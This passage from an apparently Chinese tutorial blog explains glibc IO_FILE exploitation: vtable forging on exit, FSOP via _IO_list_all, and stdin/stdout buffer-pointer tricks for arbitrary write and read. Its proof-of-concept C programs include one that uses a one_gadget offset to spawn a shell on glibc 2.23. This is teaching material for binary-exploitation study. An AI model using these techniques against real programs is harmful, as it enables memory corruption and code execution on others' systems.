class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分析程序，发现可以获取 libc 基地址，然后有 5 次 1 字节的任意地址写。<br><code>exit</code> 函数会执行 <code>_IO_cleanup</code> 函数。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We do *not* want locking.  Some threads might use streams but</span></span><br><span class="line"><span class="comment">     that is their problem, we flush them underneath them.  */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We currently don&#x27;t have a reliable mechanism for making sure that</span></span><br><span class="line"><span class="comment">     C++ static destructors are executed in the correct order.</span></span><br><span class="line"><span class="comment">     So it is possible that other static destructors might want to</span></span><br><span class="line"><span class="comment">     write to cout - and they&#x27;re supposed to be able to do so.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The following will make the standard streambufs be unbuffered,</span></span><br><span class="line"><span class="comment">     which forces any output from late destructors to be written out. */</span></span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_flush_all_lockp</code> 函数如果缓冲区有数据没有输出会执行  <code>_IO_overflow</code>  ，<code>_IO_unbuffer_all</code> 函数会执行 <code>_IO_setbuf</code> 。<br>这里调试发现只执行后者，因此可以在 <code>_IO_2_1_stderr_</code> 中伪造 <code>vtable</code> 使得  <code>_IO_setbuf</code> 位置恰好为某个指向 libc 附近的指针。然后再修改 <code>FILE</code> 使得 <code>*vtable</code> 指向伪造的 <code>vtable</code> 。最后 <code>exit</code> 得到 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ba6f899dba2824e1508bbeac6dc19363.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><p>FSOP 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数。该函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 <code>FILE</code> 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code> 。</p>
<p>在利用时要注意以下几点：</p>
<ul>
<li><p>程序执行 <code>_IO_flush_all_lockp</code> 函数有三种情况：</p>
<ul>
<li>当 <code>libc</code> 执行 <code>abort</code> 流程时</li>
<li>当执行 <code>exit</code> 函数时</li>
<li>当执行流从 <code>main</code> 函数返回时</li>
</ul>
</li>
<li><p>伪造的 <code>_IO_FILE_plus</code> 中的 <code>FILE</code> 需要绕过如下检查：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF) &#123;</span><br><span class="line">    result = EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>由于 <code>vtable</code> 伪造的位置绕不过 <code>_IO_vtable_check</code> 的检查，因此仅适应于 libc2.24 版本以下。</p>
</li>
</ul>
<p>下面举一个 FSOP 的实际例子：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x6F5D0</span>;</span><br><span class="line">    i64 *ptr = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    ptr[<span class="number">24</span>] = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    ptr[<span class="number">5</span>] = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    ptr[<span class="number">4</span>] = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    ptr[<span class="number">27</span>] = (i64) &amp;ptr[<span class="number">32</span>];<span class="comment">//*vtable</span></span><br><span class="line">    ptr[<span class="number">32</span> + <span class="number">3</span>] = libc_base + <span class="number">0x4525A</span>;<span class="comment">//_IO_overflow</span></span><br><span class="line">    i64 *list_all_ptr = (i64 *) (libc_base + <span class="number">0x3C4520</span>);</span><br><span class="line">    list_all_ptr[<span class="number">0</span>] = (i64) ptr;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用的 libc 版本如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.3.1 20160413.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>

<p>上述程序利用过程如下图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/fad85d11f5ddfbc00c817d6af8a8dbb1.png"
                     
                ><br>最后 <code>exit(0)</code> 进行如下函数调用：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/fe87cde62122bed3d4cb7a8a1e1a5d46.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>程序执行效果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/cc7c6fdbbb535a472618b90c8e268fd9.png"
                     
                ></p>
<h1 id="缓冲区的相关利用"><a href="#缓冲区的相关利用" class="headerlink" title="缓冲区的相关利用"></a>缓冲区的相关利用</h1><h2 id="stdin-标准输入缓冲区进行任意地址写"><a href="#stdin-标准输入缓冲区进行任意地址写" class="headerlink" title="stdin 标准输入缓冲区进行任意地址写"></a>stdin 标准输入缓冲区进行任意地址写</h2><p>根据前面对 <code>fread</code> 的分析已经知道通过缓冲区进行输入的大致流程，但要实现任意地址写还要绕过其中具体的检查。</p>
<ul>
<li><p><code>_IO_file_xsgetn</code> </p>
<ul>
<li><p><code>fp-&gt;_IO_buf_base </code> 为空时会执行 <code>_IO_doallocbuf(fp)</code> 初始化缓冲区，因此 <code>fp-&gt;_IO_buf_base </code> 不能为空。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">        fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果 <code>fp-&gt;_IO_read_end</code> &gt; <code> fp-&gt;_IO_read_ptr</code> 会将缓冲区中对应的数据复制到目标地址中，为了避免因为这个出现不必要的问题，最好令 <code>fp-&gt;_IO_read_end</code> &#x3D; <code> fp-&gt;_IO_read_ptr</code> 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">    want -= have;</span><br><span class="line">    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果需要读入的数据长度如果大于缓冲区大小会采用直接读入的方式，因此不能使读入的数据长度大于缓冲区大小。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><code>_IO_new_file_underflow</code></p>
<ul>
<li><p><code>_flags</code> 的 <code> _IO_NO_READS</code> 标志为不能为 1 。标志的定义是 <code>#define _IO_NO_READS 4</code> 。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS) &#123;</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>最终系统调用 <code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code> 读取数据，因此要想利用stdin输入缓冲区需设置 <code>FILE</code> 结构体中 <code>_IO_buf_base</code> 为<code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> 。同时也需将结构体中的 <code>fp-&gt;_fileno</code> 设置为 0 ，最终调用 <code>read (fp-&gt;_fileno, buf, size))</code> 读取数据。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSREAD(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<p>将上述条件综合表述为：</p>
<ul>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code> 。</li>
<li>设置 <code>_flag</code> &amp;~ <code>_IO_NO_READS</code> 即 <code>_flag</code> &amp;~ 0x4。</li>
<li>设置 <code>_fileno</code> 为 0 ，表示读入数据的来源是 <code>stdin</code> 。</li>
<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> ；且使得 <code>_IO_buf_end</code> - <code>_IO_buf_base</code> 大于 <code>fread</code> 要读的数据。</li>
</ul>
<p>举例：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line"><span class="comment">//    i64 libc_base = (i64) &amp;puts - 0x84420;</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"><span class="comment">//    FILE *fp = (FILE *) (libc_base + 0x1EC980);</span></span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line"><span class="comment">//    scanf(&quot;%s&quot;, stack_buf);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>libc 采用如下版本：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.8) stable release version 2.31.</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 9.4.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaa</span><br><span class="line">buf: aaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">stack_buf: aaa</span><br></pre></td></tr></table></figure></div>

<h2 id="stdout-标准输入缓冲区进行任意地址读写"><a href="#stdout-标准输入缓冲区进行任意地址读写" class="headerlink" title="stdout 标准输入缓冲区进行任意地址读写"></a>stdout 标准输入缓冲区进行任意地址读写</h2><p><code>stdout</code> 可以把某地址数据复制到缓冲区，然后输出出来。如果可控 <code>stdout</code> 结构体，通过构造可实现利用其进行任意地址读以及任意地址写。</p>
<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p><code>_IO_new_file_xsputn</code> 函数中有如下操作：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即当输出缓冲区不满的时候，就将待输出数据复制到输出缓冲区。因此只要将<code>_IO_write_ptr</code> 指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向 <code>write_end</code> 即可实现在目标地址写入数据。<br>举例（libc 版本同上）：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">efghi</span><br><span class="line">buf: abcd56</span><br></pre></td></tr></table></figure></div>

<p>其中复制到 <code>buf</code> 中的数据没有输出的原因是 <code>_IO_overflow</code> 函数没有正常执行，接下来任意地址读会有更多分析。 </p>
<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>程序正确执行到 <code>_IO_overflow</code> 时会将输出缓冲区中的数据输出出来，只要将要泄露的位置设置为输出缓冲区就可以泄露内容。但还要绕过一系列检查：</p>
<ul>
<li><p><code>_IO_new_file_xsputn</code></p>
<ul>
<li>如果 <code>f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr</code> 说明输出缓冲区还没有写满，就会将待输出的数据写入缓冲区，实际上 <code>_IO_overflow</code> 只有在输出缓冲区写满的时候才将其输出。因此为了不造成不必要的麻烦，直接令 <code>f-&gt;_IO_write_end = f-&gt;_IO_write_ptr</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)count = to_do;</span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>_IO_new_file_overflow</code></p>
<ul>
<li><code>_flags</code> 不能包含 <code>_IO_NO_WRITES</code> ，其中 <code>_IO_NO_WRITES</code> 的值为 0x8 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno(EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>为了避免进入如下分枝进造成不必要的麻烦， <code>_flags</code> 应包含 <code>_IO_CURRENTLY_PUTTING</code> ，其中 <code>_IO_CURRENTLY_PUTTING</code> 的值为 0x0800 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>为了调用 <code>_IO_do_write</code> 输出缓冲区内容，令 <code>_IO_write_base = read_start</code> ，<code>_IO_write_ptr = read_end</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>new_do_write</code></p>
<ul>
<li>构造 <code>_flags</code> 包含 <code>_IO_IS_APPENDING</code> 或者 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 就可以直接执行到 <code>_IO_SYSWRITE</code> 。其中 <code>_IO_IS_APPENDING</code> 的值为 0x1000 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> count;</span><br><span class="line"> <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">      you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">      not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">      Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">      unpredictable. */</span></span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">off64_t</span> new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">     <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>最后 <code>_IO_SYSWRITE</code> 调用 <code>write (f-&gt;_fileno, data, to_do)</code> 输出数据，因此还需构造 <code>_fileno</code> 为标准输出描述符 1 。</p>
</li>
</ul>
<p>将上述条件综合描述为：</p>
<ul>
<li>设置 <code>_flag</code> &amp;~ <code>_IO_NO_WRITES</code> 即 <code>_flag</code> &amp;~ 0x8。</li>
<li>设置 <code>_flag</code> &amp; <code>_IO_CURRENTLY_PUTTING</code> 即 <code>_flag</code> | 0x800</li>
<li>设置 <code>_fileno</code> 为1。</li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。</li>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 或设置 <code>_flag</code> &amp; <code>_IO_IS_APPENDING</code> 即 <code>_flag</code> | 0x1000。</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code>（非必须）。</li>
</ul>
<p>满足上述五个条件，可实现任意读。<br>举例：</p>
